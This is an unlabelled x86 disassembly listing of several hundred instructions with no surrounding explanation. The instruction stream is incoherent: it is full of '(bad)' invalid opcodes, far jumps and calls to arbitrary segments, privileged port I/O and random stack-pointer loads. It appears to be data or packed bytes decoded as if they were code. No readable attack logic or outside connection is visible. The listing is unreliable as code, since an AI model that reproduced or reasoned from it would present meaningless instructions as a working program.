  40a6bb:	aad    0x62
  40a6bd:	xchg   edi,eax
  40a6be:	ja     0x40a6f9
  40a6c0:	push   ecx
  40a6c1:	pop    es
  40a6c2:	mov    eax,ds:0xf4aea0f2
  40a6c7:	sbb    al,0xcb
  40a6c9:	(bad)  
  40a6ca:	call   0xb495:0x5b987818
  40a6d1:	cmp    eax,0xbbe399f9
  40a6d6:	add    eax,0xb6ea0836
  40a6db:	push   0x36b0b67f
  40a6e0:	jne    0x40a755
  40a6e2:	add    BYTE PTR [ecx-0x15cf0e30],cl
  40a6e8:	sbb    eax,0x1a784fee
  40a6ed:	inc    ebp
  40a6ee:	adc    edi,esi
  40a6f0:	ss mov esi,0x9f15e6fc
  40a6f6:	and    eax,DWORD PTR [ecx-0x62a6154c]
  40a6fc:	stc    
  40a6fd:	inc    DWORD PTR [ecx-0x454445b7]
  40a703:	add    ecx,DWORD PTR [ecx]
  40a705:	sub    ecx,edx
  40a707:	cmp    ebx,edi
  40a709:	mov    bh,0xfa
  40a70b:	push   esi
  40a70c:	stos   DWORD PTR es:[edi],eax
  40a70d:	jns    0x40a69f
  40a70f:	fisubr WORD PTR [ecx-0x5500cf6e]
  40a715:	jmp    DWORD PTR [esp+esi*2]
  40a718:	enter  0xa72f,0x17
  40a71c:	mov    es,ebx
  40a71e:	fisttp QWORD PTR [ebx-0x6719b202]
  40a724:	inc    edx
  40a725:	lods   eax,DWORD PTR ds:[esi]
  40a726:	pop    ss
  40a727:	cld    
  40a728:	sbb    BYTE PTR [edx],dl
  40a72a:	mov    ?,WORD PTR [eax+ebx*2+0x32d0ec40]
  40a731:	stc    
  40a732:	ins    DWORD PTR es:[edi],dx
  40a733:	cmp    BYTE PTR [ecx+0x54017121],0x23
  40a73a:	shl    BYTE PTR [eax-0x130afbc6],0x3d
  40a741:	adc    eax,0xd235bf4c
  40a746:	inc    ebx
  40a747:	push   ebp
  40a748:	ficom  WORD PTR [esp+ecx*4]
  40a74b:	or     BYTE PTR ds:0x4db44f48,bh
  40a751:	ds pop esp
  40a753:	pop    edi
  40a754:	adc    BYTE PTR [eax-0x5c],al
  40a757:	ja     0x40a77b
  40a759:	xchg   ebx,eax
  40a75a:	pop    ebp
  40a75b:	cmp    ebx,DWORD PTR [ebx+0x37c031d7]
  40a761:	into   
  40a762:	mov    eax,esp
  40a764:	jmp    0xffbb:0xb46a71d8
  40a76b:	js     0x40a71e
  40a76d:	lods   eax,DWORD PTR ds:[esi]
  40a76e:	outs   dx,BYTE PTR ds:[esi]
  40a76f:	(bad)  
  40a770:	test   BYTE PTR [eax+0xeaed901],0xd7
  40a777:	gs push edi
  40a779:	jno    0x40a7ea
  40a77b:	ficom  DWORD PTR [edx-0x3d538954]
  40a781:	in     al,dx
  40a782:	pop    ebp
  40a783:	push   cs
  40a784:	inc    edi
  40a785:	imul   ebx,edi,0xffffffd4
  40a788:	in     al,0xc7
  40a78a:	jge    0x40a7d7
  40a78c:	outs   dx,DWORD PTR ds:[esi]
  40a78d:	xor    ch,BYTE PTR [edx-0x679d96e4]
  40a793:	aam    0xf2
  40a795:	clc    
  40a796:	push   ds
  40a797:	and    eax,0x7701bc07
  40a79c:	icebp  
  40a79d:	pushf  
  40a79e:	ins    DWORD PTR es:[edi],dx
  40a79f:	mov    edx,0xb53f0b2
  40a7a4:	fbstp  TBYTE PTR [ebp-0x1750ca7c]
  40a7aa:	ret    
  40a7ab:	adc    eax,DWORD PTR [esi-0x1c874c3d]
  40a7b1:	sub    BYTE PTR [ecx],dh
  40a7b3:	push   cs
  40a7b4:	call   DWORD PTR [edx+ecx*4-0x19873f5d]
  40a7bb:	xchg   ebp,eax
  40a7bc:	push   edi
  40a7bd:	xorps  xmm7,XMMWORD PTR [eax]
  40a7c0:	inc    edx
  40a7c1:	rcl    bh,1
  40a7c3:	fisubr DWORD PTR [edi+0x26]
  40a7c6:	test   BYTE PTR [edi],0x3c
  40a7c9:	push   0xffffff86
  40a7cb:	mov    esp,0xdf5f15b3
  40a7d0:	cli    
  40a7d1:	jg     0x40a76f
  40a7d3:	or     eax,0xc981fea6
  40a7d8:	sub    esp,DWORD PTR [esi+0x36]
  40a7db:	lahf   
  40a7dc:	pop    esi
  40a7dd:	retf   
  40a7de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7df:	test   BYTE PTR [esi-0x100e99b6],al
  40a7e5:	(bad)
  40a7e8:	cmp    DWORD PTR [esi],edx
  40a7ea:	push   0xffffffd9
  40a7ec:	ds fwait
  40a7ee:	sti    
  40a7ef:	fsub   DWORD PTR [eax+0x79eb653a]
  40a7f5:	mov    ah,0xb3
  40a7f7:	mov    dl,0x9f
  40a7f9:	dec    esp
  40a7fa:	jg     0x40a801
  40a7fc:	xchg   ebx,eax
  40a7fd:	lea    esp,[eax+0x26325589]
  40a803:	mov    ecx,0x79a241f1
  40a808:	fxch   st(3)
  40a80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a80b:	sar    DWORD PTR [ebp+0x100cc27c],1
  40a811:	clc    
  40a812:	dec    ecx
  40a813:	cwde   
  40a814:	inc    esi
  40a815:	mov    dh,0xb
  40a817:	cmp    al,0x1b
  40a819:	add    BYTE PTR ds:0x2e60285b,bl
  40a81f:	jo     0x40a87d
  40a821:	scas   eax,DWORD PTR es:[edi]
  40a822:	loop   0x40a7eb
  40a824:	xchg   esi,eax
  40a825:	and    bl,BYTE PTR [edx]
  40a827:	sbb    al,0x7a
  40a829:	xchg   BYTE PTR fs:[edi],bl
  40a82c:	mov    ecx,esi
  40a82e:	ja     0x40a8ae
  40a830:	mov    dl,0xd
  40a832:	or     eax,0xba46ea7d
  40a838:	adc    eax,0xca6589ba
  40a83d:	mov    eax,ds:0x7c1cf86f
  40a842:	test   BYTE PTR [ebp-0x4c52658d],ch
  40a848:	into   
  40a849:	jl     0x40a89a
  40a84b:	cmp    BYTE PTR [edi-0x3e],al
  40a84e:	scas   eax,DWORD PTR es:[edi]
  40a84f:	cmp    BYTE PTR [ecx-0x5d8fa2bf],bl
  40a855:	jp     0x40a7da
  40a857:	and    bl,ah
  40a859:	fbstp  TBYTE PTR [edx]
  40a85b:	jg     0x40a7ff
  40a85d:	sub    BYTE PTR [eax],ah
  40a85f:	rcr    DWORD PTR ds:0x27a2393f,0xf3
  40a866:	ins    DWORD PTR es:[edi],dx
  40a867:	fbld   TBYTE PTR [esi-0x4c888a8c]
  40a86d:	fs jmp 0xd29b28c0
  40a873:	hlt    
  40a874:	ffree  st(2)
  40a876:	sbb    al,0x3b
  40a878:	test   al,0xdc
  40a87a:	mov    dh,0x4e
  40a87c:	mov    esp,0x55d2c5c5
  40a881:	adc    DWORD PTR [ebx+0x6e8d8142],eax
  40a887:	dec    DWORD PTR [esi-0x58]
  40a88a:	js     0x40a83b
  40a88c:	mov    dl,BYTE PTR [esi-0x17]
  40a88f:	mov    bh,0x69
  40a891:	outs   dx,BYTE PTR ds:[esi]
  40a892:	out    0x13,eax
  40a894:	cmp    BYTE PTR [esi-0x71193325],ah
  40a89a:	sub    DWORD PTR [esi],edi
  40a89c:	inc    eax
  40a89d:	cwde   
  40a89e:	mov    ecx,ds
  40a8a0:	in     eax,dx
  40a8a1:	ja     0x40a90f
  40a8a3:	test   DWORD PTR [esi+0x8],edi
  40a8a6:	and    bl,bh
  40a8a8:	data16 cmp al,0x7b
  40a8ab:	pop    ss
  40a8ac:	aas    
  40a8ad:	icebp  
  40a8ae:	cmp    BYTE PTR [ecx-0x58],dh
  40a8b1:	cmp    dl,BYTE PTR [eax]
  40a8b3:	or     al,0x88
  40a8b5:	std    
  40a8b6:	and    bl,BYTE PTR cs:[ecx]
  40a8b9:	ss jl  0x40a8f1
  40a8bc:	cmc    
  40a8bd:	pop    eax
  40a8be:	mov    bl,0x8e
  40a8c0:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a8c2:	test   DWORD PTR es:[eax-0x28479f2b],ecx
  40a8c9:	mov    bl,0x8a
  40a8cb:	and    ebx,edi
  40a8cd:	sbb    al,0x8c
  40a8cf:	jo     0x40a88b
  40a8d1:	sbb    BYTE PTR [edi+esi*1],0x49
  40a8d5:	into   
  40a8d6:	mov    bl,0x87
  40a8d8:	mov    al,bl
  40a8da:	xchg   ebp,eax
  40a8db:	push   es
  40a8dc:	add    BYTE PTR [ecx-0x3f],cl
  40a8df:	call   0x26e1:0x5749b02f
  40a8e6:	xor    al,0x83
  40a8e8:	push   0x1e
  40a8ea:	mov    esp,0xffe9ecd0
  40a8ef:	sbb    esp,DWORD PTR [edi]
  40a8f1:	repz sub BYTE PTR [eax+esi*4-0x61f1fef8],al
  40a8f9:	sbb    DWORD PTR [eax],0x1f86b462
  40a8ff:	pop    ebp
  40a900:	pop    es
  40a901:	add    dh,BYTE PTR [ecx+esi*1-0x64]
  40a905:	pop    ebx
  40a906:	rcl    BYTE PTR [ecx],cl
  40a908:	adc    al,0x3e
  40a90a:	dec    eax
  40a90b:	mov    esp,0x2774a187
  40a910:	loope  0x40a990
  40a912:	adc    eax,0xdfca879d
  40a917:	push   es
  40a918:	cdq    
  40a919:	sbb    DWORD PTR [edx+ecx*1],esi
  40a91c:	mov    eax,0x65fd4fcd
  40a921:	pop    edi
  40a922:	retf   
  40a923:	inc    eax
  40a924:	mov    cl,BYTE PTR [ebx+0x16]
  40a927:	sub    DWORD PTR [eax+0x573d8b0c],ecx
  40a92d:	cli    
  40a92e:	sti    
  40a92f:	sbb    DWORD PTR [esi-0x43fbeef7],eax
  40a935:	(bad)  
  40a936:	xchg   ebx,eax
  40a937:	test   DWORD PTR [eax],edi
  40a939:	xor    eax,0x852c1ded
  40a93e:	xchg   edx,eax
  40a93f:	jb     0x40a910
  40a941:	and    eax,0xc4afa994
  40a946:	mov    esi,0x7bd72178
  40a94b:	xor    eax,edx
  40a94d:	sbb    al,0x2
  40a94f:	mov    bh,0xd9
  40a951:	fisubr DWORD PTR [ebx-0x7c]
  40a954:	jae    0x40a8fb
  40a956:	cwde   
  40a957:	mov    edx,0xf4de42ff
  40a95c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a95d:	dec    ecx
  40a95e:	es xchg ebp,eax
  40a960:	hlt    
  40a961:	loope  0x40a90a
  40a963:	in     eax,0x39
  40a965:	out    dx,eax
  40a966:	pop    eax
  40a967:	test   BYTE PTR [edx+edi*8-0x1d],dh
  40a96b:	ins    DWORD PTR es:[edi],dx
  40a96c:	lods   eax,DWORD PTR ds:[esi]
  40a96d:	dec    edx
  40a96e:	cmp    DWORD PTR [edi],0xfc6811b8
  40a974:	lea    edi,[ecx-0xeb4e153]
  40a97a:	or     eax,DWORD PTR [edx-0x9]
  40a97d:	repnz mov esp,0xd698528d
  40a983:	neg    DWORD PTR es:[esi]
  40a986:	or     bl,BYTE PTR [eax]
  40a988:	lea    esi,[ecx+0x1]
  40a98b:	add    ebx,DWORD PTR [ebx+0x4e4628f1]
  40a991:	outs   dx,BYTE PTR ds:[esi]
  40a992:	mov    ds:0x50bb228b,eax
  40a997:	test   eax,0x7f15bca1
  40a99c:	mov    al,0xcd
  40a99e:	push   eax
  40a99f:	imul   DWORD PTR ds:0x879cac41
  40a9a5:	push   ds
  40a9a6:	rep stos BYTE PTR es:[edi],al
  40a9a8:	xchg   ebx,eax
  40a9a9:	std    
  40a9aa:	mov    bl,0x8c
  40a9ac:	loop   0x40aa16
  40a9ae:	mov    edx,0x4d4adade
  40a9b3:	mov    bh,0x91
  40a9b5:	ins    DWORD PTR es:[edi],dx
  40a9b6:	lods   eax,DWORD PTR ds:[esi]
  40a9b7:	ins    BYTE PTR es:[edi],dx
  40a9b8:	(bad)  
  40a9b9:	icebp  
  40a9ba:	cmp    eax,0xa22349d7
  40a9bf:	call   ecx
  40a9c1:	mov    ah,0x34
  40a9c3:	inc    edx
  40a9c4:	dec    ebp
  40a9c5:	fs arpl sp,si
  40a9c8:	mov    ebx,0xc31b0257
  40a9cd:	cmp    ebx,ebp
  40a9cf:	lds    edi,FWORD PTR [ecx]
  40a9d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9d2:	sbb    al,0x57
  40a9d4:	and    eax,0x1134d659
  40a9d9:	icebp  
  40a9da:	repz cmc 
  40a9dc:	xchg   edx,eax
  40a9dd:	pop    esi
  40a9de:	repz popf 
  40a9e0:	mov    al,ds:0x931d9404
  40a9e5:	iret   
  40a9e6:	sbb    edi,DWORD PTR [eax+0x61e70b0]
  40a9ec:	fild   DWORD PTR [esi+0x52]
  40a9ef:	mov    dh,0x10
  40a9f1:	cmc    
  40a9f2:	mov    BYTE PTR [ecx],ch
  40a9f4:	test   BYTE PTR [ecx],ah
  40a9f6:	dec    esi
  40a9f7:	imul   edx,ebp,0xdbb77296
  40a9fd:	jmp    0x40a9d6
  40a9ff:	push   edx
  40aa00:	push   ss
  40aa01:	or     BYTE PTR [edi+edi*8-0x5cad56ab],cl
  40aa08:	fst    DWORD PTR [edx+0x65a98cf4]
  40aa0e:	dec    eax
  40aa0f:	xor    ch,BYTE PTR [edi*2-0x6c7e18e4]
  40aa16:	mov    dh,0x18
  40aa18:	push   edx
  40aa19:	pop    esi
  40aa1a:	or     al,bl
  40aa1c:	ja     0x40aa32
  40aa1e:	or     ch,ch
  40aa20:	stc    
  40aa21:	inc    esi
  40aa22:	lds    ebx,FWORD PTR [edi+0x4d]
  40aa25:	pop    edx
  40aa26:	clc    
  40aa27:	cvtps2pi mm2,QWORD PTR [ebx-0x63]
  40aa2b:	adc    dl,BYTE PTR [edx-0xf]
  40aa2e:	mov    edx,0xc1a9abf3
  40aa33:	cdq    
  40aa34:	cmovae ebp,DWORD PTR [ebx+eiz*4-0x4d]
  40aa39:	int    0x18
  40aa3b:	or     al,0x6e
  40aa3d:	stos   BYTE PTR es:[edi],al
  40aa3e:	push   esp
  40aa3f:	jp     0x40aa53
  40aa41:	jb     0x40aa2b
  40aa43:	lods   eax,DWORD PTR ds:[esi]
  40aa44:	(bad)  
  40aa45:	sbb    al,0x39
  40aa47:	jp     0x40a9e7
  40aa49:	or     BYTE PTR [edx],dl
  40aa4b:	cmp    al,0xc9
  40aa4d:	push   ecx
  40aa4e:	xor    eax,0x3233092a
  40aa53:	dec    edi
  40aa54:	xor    eax,0xf7533a9b
  40aa59:	sub    al,0x21
  40aa5b:	pop    ebp
  40aa5c:	loope  0x40aa90
  40aa5e:	mov    bl,BYTE PTR [ebx+0x10]
  40aa61:	test   al,0xcd
  40aa63:	(bad)  
  40aa64:	cmp    al,0x92
  40aa66:	repz ret 
  40aa68:	pop    es
  40aa69:	je     0x40aa71
  40aa6b:	stos   DWORD PTR es:[edi],eax
  40aa6c:	ret    
  40aa6d:	das    
  40aa6e:	ror    DWORD PTR [edi-0x49],cl
  40aa71:	ds xchg ebp,eax
  40aa73:	fadd   st,st(0)
  40aa75:	dec    esi
  40aa76:	mov    ebx,0xa2346fc4
  40aa7b:	pop    edx
  40aa7c:	mov    cl,0x2d
  40aa7e:	inc    edi
  40aa7f:	xchg   BYTE PTR [esi-0x32d26315],dl
  40aa85:	mov    ecx,0xcf141a54
  40aa8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa8b:	sbb    eax,DWORD PTR [esi]
  40aa8d:	loop   0x40aa46
  40aa8f:	push   ds
  40aa90:	test   DWORD PTR [ebx],ebp
  40aa92:	xor    dh,BYTE PTR [edi]
  40aa94:	xor    eax,0x1cfdaabb
  40aa99:	rcr    ah,cl
  40aa9b:	xchg   edi,eax
  40aa9c:	cmp    ch,BYTE PTR [edx+0x70]
  40aa9f:	pop    esp
  40aaa0:	push   esp
  40aaa1:	out    0x39,al
  40aaa3:	mul    BYTE PTR [edx]
  40aaa5:	arpl   WORD PTR [esi+0x24c93468],si
  40aaab:	lds    ebx,FWORD PTR [edi]
  40aaad:	xchg   edi,eax
  40aaae:	mov    BYTE PTR [ecx-0x3],bl
  40aab1:	cli    
  40aab2:	retw   0x90a4
  40aab6:	adc    dh,BYTE PTR [eax+edx*4+0x74]
  40aaba:	inc    ebp
  40aabb:	gs mov edi,0xeee2da0f
  40aac1:	and    al,0x5b
  40aac3:	push   ss
  40aac4:	xor    esp,esp
  40aac6:	cld    
  40aac7:	jmp    0x40aae9
  40aac9:	add    DWORD PTR [esi+0x64],esi
  40aacc:	sbb    edi,ebp
  40aace:	je     0x35ccdf96
  40aad4:	fadd   DWORD PTR [ebp+0x71fb7f91]
  40aada:	int3   
  40aadb:	inc    edi
  40aadc:	xchg   esi,eax
  40aadd:	jae    0x40aa93
  40aadf:	out    0x3b,al
  40aae1:	dec    ebx
  40aae2:	pop    es
  40aae3:	out    dx,eax
  40aae4:	(bad)  [edx+0x2a]
  40aae7:	mov    eax,ds:0x6355320
  40aaec:	scas   eax,DWORD PTR es:[edi]
  40aaed:	mov    dl,0xea
  40aaef:	dec    edi
  40aaf0:	adc    eax,0x38378e76
  40aaf5:	jle    0x40ab4b
  40aaf7:	mov    ecx,0x887f92a9
  40aafc:	aad    0xb2
  40aafe:	xchg   esi,eax
  40aaff:	mov    edx,0x41850959
  40ab04:	pop    esp
  40ab05:	inc    esi
  40ab06:	(bad)  
  40ab07:	imul   ebx,DWORD PTR [ebx-0x2d],0x32
  40ab0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0c:	sti    
  40ab0d:	addr16 dec esi
  40ab0f:	sahf   
  40ab10:	push   edi
  40ab11:	fucomp st(2)
  40ab13:	mov    eax,ds:0xf35d65bc
  40ab18:	in     eax,0xa
  40ab1a:	mov    BYTE PTR [edx],ch
  40ab1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab1d:	jbe    0x40aad7
  40ab1f:	fwait
  40ab20:	test   eax,0x69405d73
  40ab25:	and    BYTE PTR [ecx],al
  40ab27:	ins    BYTE PTR es:[edi],dx
  40ab28:	cmp    BYTE PTR [edi+eax*2],dh
  40ab2b:	inc    ecx
  40ab2c:	nop
  40ab2d:	test   ecx,esi
  40ab2f:	push   eax
  40ab30:	adc    DWORD PTR [ecx-0x2f26b86],esp
  40ab36:	test   BYTE PTR [ecx+0x4d],dh
  40ab39:	sar    DWORD PTR [esp+ebp*4-0x18d5ea65],0x60
  40ab41:	cmp    BYTE PTR [eax+0x6c],bh
  40ab44:	scas   eax,DWORD PTR es:[edi]
  40ab45:	dec    esi
  40ab46:	loop   0x40abaf
  40ab48:	mov    ch,0x49
  40ab4a:	(bad)  
  40ab4b:	shr    BYTE PTR [esi-0xa92dc60],1
  40ab51:	or     BYTE PTR [edx+0x44],cl
  40ab54:	(bad)  
  40ab55:	mov    eax,ds:0xe0153b54
  40ab5a:	mov    eax,esp
  40ab5c:	test   DWORD PTR [esi+0x3bb23a2f],edi
  40ab62:	jmp    0x40abe0
  40ab64:	dec    esp
  40ab66:	jne    0x40ab2a
  40ab68:	es inc esi
  40ab6a:	jl     0x40ab79
  40ab6c:	ret    
  40ab6d:	cmp    cl,BYTE PTR [ebx-0x62686b2d]
  40ab73:	xchg   esi,eax
  40ab74:	popa   
  40ab75:	sub    BYTE PTR [edi-0x1c],0xe7
  40ab79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab7a:	push   es
  40ab7b:	in     eax,dx
  40ab7c:	fs mov bl,0x74
  40ab7f:	sti    
  40ab80:	add    eax,0x5903207
  40ab85:	loope  0x40ab55
  40ab87:	int3   
  40ab88:	mov    esi,ebx
  40ab8a:	and    edi,DWORD PTR [ebp+ebp*4-0x2cf7c2e3]
  40ab91:	dec    ebx
  40ab92:	adc    eax,0xbeb3580d
  40ab97:	enter  0x2e1e,0x8f
  40ab9b:	mov    al,0xde
  40ab9d:	loop   0x40ab4d
  40ab9f:	fmul   st(4),st
  40aba1:	inc    eax
  40aba2:	icebp  
  40aba3:	sbb    esi,DWORD PTR [edx-0x47]
  40aba6:	clc    
  40aba7:	call   0xbbb64e8b
  40abac:	aad    0x45
  40abae:	retf   
  40abaf:	sbb    BYTE PTR [edi-0x14019dd6],ch
  40abb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abb6:	ret    0x3a8d
  40abb9:	xchg   DWORD PTR [ebx-0xc],esp
  40abbc:	adc    eax,0xc1af0f73
  40abc1:	mov    eax,ds:0x7f1528da
  40abc6:	out    dx,al
  40abc7:	bound  edx,QWORD PTR [ecx]
  40abc9:	mov    dh,0xd5
  40abcb:	into   
  40abcc:	je     0x40ac2f
  40abce:	jb     0x40ab84
  40abd0:	mov    ebp,0x709efa97
  40abd5:	pop    ebx
  40abd6:	int    0x18
  40abd8:	aad    0xd6
  40abda:	jg     0x40abd0
  40abdc:	mov    dl,0x30
  40abde:	pop    ebp
  40abdf:	mul    BYTE PTR [esi+0x15]
  40abe2:	fld    QWORD PTR [ebx]
  40abe4:	sti    
  40abe5:	jo     0x40ab9f
  40abe7:	repnz mov edx,0x6aad6fac
  40abed:	aad    0xaf
  40abef:	pusha  
  40abf0:	enter  0xd92,0x4d
  40abf4:	mov    eax,0xfbb9de03
  40abf9:	jmp    0x8224:0x51a21cd3
  40ac00:	hlt    
  40ac01:	push   cs
  40ac02:	repnz stc 
  40ac04:	les    ecx,FWORD PTR [ebp+0x4b]
  40ac07:	dec    edi
  40ac08:	mov    dl,0x4c
  40ac0a:	fs dec edx
  40ac0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac0d:	xchg   ecx,eax
  40ac0e:	mov    ah,0x1f
  40ac10:	mov    ebp,0x54c0289
  40ac15:	xor    esi,DWORD PTR [eax]
  40ac17:	mov    ah,0x44
  40ac19:	in     al,dx
  40ac1a:	push   cs
  40ac1b:	out    dx,eax
  40ac1c:	mov    ecx,0x4157c83f
  40ac21:	mov    esi,0xc60b7e8e
  40ac26:	sbb    ah,ah
  40ac28:	push   edx
  40ac29:	rol    DWORD PTR [esi-0x14],1
  40ac2c:	or     BYTE PTR [edx],dl
  40ac2e:	jmp    0xadccb771
  40ac33:	sub    bh,BYTE PTR [edi+0xf]
  40ac36:	(bad)  
  40ac37:	sbb    eax,0xfcf9afa8
  40ac3c:	sbb    ecx,DWORD PTR [ebx+0x64]
  40ac3f:	mov    edi,0x37d58629
  40ac44:	dec    ebx
  40ac45:	push   ebp
  40ac46:	repnz es dec ebx
  40ac49:	mov    ds,WORD PTR [edx+0x74]
  40ac4c:	push   esp
  40ac4d:	pop    ds
  40ac4e:	call   0x53ab41f9
  40ac53:	push   cs
  40ac54:	mov    bl,0x6b
  40ac56:	aad    0xd3
  40ac58:	lds    edx,FWORD PTR [edx+edi*4]
  40ac5b:	loope  0x40ac82
  40ac5d:	mov    ebp,0x7725f499
  40ac62:	mov    ds:0x10ce6c81,eax
  40ac67:	loope  0x40aca9
  40ac69:	fs test eax,0x9b49c011
  40ac6f:	mov    ds:0xfc1a2a46,eax
  40ac74:	and    bl,BYTE PTR [esi-0x3a]
  40ac77:	jmp    0x40ac5a
  40ac79:	cli    
  40ac7a:	pop    edi
  40ac7b:	dec    edx
  40ac7c:	aad    0x39
  40ac7e:	test   al,0xca
  40ac80:	in     al,dx
  40ac81:	sbb    BYTE PTR [esi-0x7d],dl
  40ac84:	dec    edx
  40ac85:	cld    
  40ac86:	pop    ecx
  40ac87:	(bad)  
  40ac88:	hlt    
  40ac89:	cmp    BYTE PTR [ebx+ebp*1-0x5b03d41d],al
  40ac90:	mov    dl,0x6
  40ac92:	push   edx
  40ac93:	push   ebx
  40ac94:	cs js  0x40acea
  40ac97:	pop    ecx
  40ac98:	mov    edi,0x96
	...
  40ad11:	add    BYTE PTR [eax],al
  40ad13:	add    BYTE PTR [ebx-0x2370a3bd],al
  40ad19:	lahf   
  40ad1a:	ror    DWORD PTR [edi-0x18],cl
  40ad1d:	pushw  0x34
  40ad20:	push   ss
  40ad21:	add    BYTE PTR [ecx],0xd
  40ad24:	(bad)  
  40ad25:	pop    esi
  40ad26:	add    BYTE PTR [eax],al
  40ad28:	outs   dx,BYTE PTR ds:[esi]
  40ad29:	pop    es
  40ad2a:	add    BYTE PTR [eax],al
  40ad2c:	sub    edx,DWORD PTR [ebp-0x5655f5b5]
  40ad32:	and    eax,0x59edd612
  40ad37:	dec    edx
  40ad38:	in     eax,dx
  40ad39:	mov    BYTE PTR [ebp-0x7c],al
  40ad3c:	loope  0x40acc8
  40ad3e:	repnz inc edx
  40ad40:	jecxz  0x40ada2
  40ad42:	icebp  
  40ad43:	aas    
  40ad44:	sub    DWORD PTR [edi-0x1610b1d5],ebx
  40ad4a:	call   0x3482:0xa00dcab7
  40ad51:	mov    bh,BYTE PTR [eax+0x29]
  40ad54:	sbb    eax,0xa5a3d30d
  40ad59:	(bad)  
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	adc    eax,DWORD PTR [ebx+0x63]
  40ad5e:	outs   dx,BYTE PTR ds:[esi]
  40ad5f:	aas    
  40ad60:	aad    0x1b
  40ad62:	push   eax
  40ad63:	lock mov WORD PTR [esp+ecx*2],cs
  40ad67:	into   
  40ad68:	ins    BYTE PTR es:[edi],dx
  40ad69:	adc    bl,BYTE PTR [ebx+eiz*1]
  40ad6c:	stos   DWORD PTR es:[edi],eax
  40ad6d:	adc    DWORD PTR [edi+0x30730a35],ecx
  40ad73:	or     eax,edi
  40ad75:	stc    
  40ad76:	dec    esi
  40ad77:	popa   
  40ad78:	cmp    DWORD PTR [esi+ecx*2-0x35],esp
  40ad7c:	mov    ah,0x77
  40ad7e:	pusha  
  40ad7f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40ad81:	inc    edi
  40ad82:	aam    0x28
  40ad84:	dec    BYTE PTR [edx]
  40ad86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad87:	xor    ebx,DWORD PTR [esi+0x636b932a]
  40ad8d:	cli    
  40ad8e:	nop
  40ad8f:	pusha  
  40ad90:	loop   0x40adbe
  40ad92:	pushf  
  40ad93:	(bad)  
  40ad94:	in     eax,dx
  40ad95:	adc    esp,DWORD PTR [edi-0x23]
  40ad98:	push   0xffffff82
  40ad9a:	cdq    
  40ad9b:	mov    eax,ds:0x3f727f9c
  40ada0:	scas   eax,DWORD PTR es:[edi]
  40ada1:	fcmovbe st,st(7)
  40ada3:	(bad)  
  40ada4:	cmp    BYTE PTR ds:0xde8aa51a,dl
  40adaa:	xor    al,0x86
  40adac:	pop    esp
  40adad:	mov    eax,ds:0xaacf391f
  40adb2:	xor    DWORD PTR [eax-0x73],eax
  40adb5:	or     dl,BYTE PTR [ebx+0x76]
  40adb8:	gs mov cl,0xc6
  40adbb:	mov    bh,0xe2
  40adbd:	test   DWORD PTR [esi],edi
  40adbf:	pop    esp
  40adc0:	inc    esi
  40adc1:	mov    dh,0xe8
  40adc3:	jecxz  0x40ad89
  40adc5:	popa   
  40adc6:	(bad)  
  40adc7:	push   0xffffff80
  40adc9:	cmp    DWORD PTR [ebx+0x4e],0xffffffe4
  40adcd:	div    al
  40adcf:	sbb    ecx,DWORD PTR [ebx+esi*1+0x4543e499]
  40add6:	ja     0x40ada3
  40add8:	hlt    
  40add9:	jns    0x40ae3a
  40addb:	sbb    al,0xd8
  40addd:	(bad)  
  40adde:	lock pop ecx
  40ade0:	rcl    BYTE PTR [eax-0x4b],1
  40ade3:	clc    
  40ade4:	jno    0x40ad81
  40ade6:	inc    esi
  40ade7:	inc    ebp
  40ade8:	mov    esi,0xb763ac76
  40aded:	push   edi
  40adee:	sbb    eax,0x91012311
  40adf3:	sub    al,0xfd
  40adf5:	adc    ebp,DWORD PTR [ebx+0x70]
  40adf8:	pop    ebp
  40adf9:	pop    ecx
  40adfa:	nop/reserved BYTE PTR [edi+0x7ab70a9f]
  40ae01:	mov    al,0xb7
  40ae03:	fnstsw WORD PTR [eax]
  40ae05:	inc    eax
  40ae06:	inc    ebp
  40ae07:	jne    0x40ae4a
  40ae09:	sub    ch,BYTE PTR [esi]
  40ae0b:	in     al,0xd2
  40ae0d:	in     eax,0xc3
  40ae0f:	and    ch,BYTE PTR [ecx-0x6e87193c]
  40ae15:	inc    esi
  40ae16:	mov    cl,0x4a
  40ae18:	xor    eax,0xfa294141
  40ae1d:	mov    ebx,0xb0d4922d
  40ae22:	push   eax
  40ae23:	pop    eax
  40ae24:	push   edi
  40ae25:	adc    DWORD PTR ds:0x59792573,ecx
  40ae2b:	and    DWORD PTR [edx+0x2c],ecx
  40ae2e:	call   0x53c4494b
  40ae33:	mov    eax,0x78b4ddc3
  40ae38:	out    0x9f,al
  40ae3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae3b:	int3   
  40ae3c:	imul   edx,DWORD PTR [edi-0x3a],0xbb5fa9d8
  40ae43:	jmp    0x356137d6
  40ae48:	cwde   
  40ae49:	ja     0x40ae60
  40ae4b:	in     al,dx
  40ae4c:	jne    0x40adf4
  40ae4e:	xchg   DWORD PTR [esp+eax*1],esi
  40ae51:	in     eax,0x7f
  40ae53:	mov    eax,ds:0x8b19681f
  40ae58:	mov    edi,DWORD PTR ss:[edx]
  40ae5b:	aaa    
  40ae5c:	mov    al,0x74
  40ae5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae5f:	ror    BYTE PTR [edi+0x5c],cl
  40ae62:	daa    
  40ae63:	pop    edi
  40ae64:	stos   DWORD PTR es:[edi],eax
  40ae65:	inc    edx
  40ae66:	shl    BYTE PTR [edi-0x5540d74c],cl
  40ae6c:	out    0xec,eax
  40ae6e:	push   ebx
  40ae6f:	mov    eax,ecx
  40ae71:	in     eax,0xc1
  40ae73:	inc    esp
  40ae74:	adc    eax,DWORD PTR [eax]
  40ae76:	mov    bh,0x15
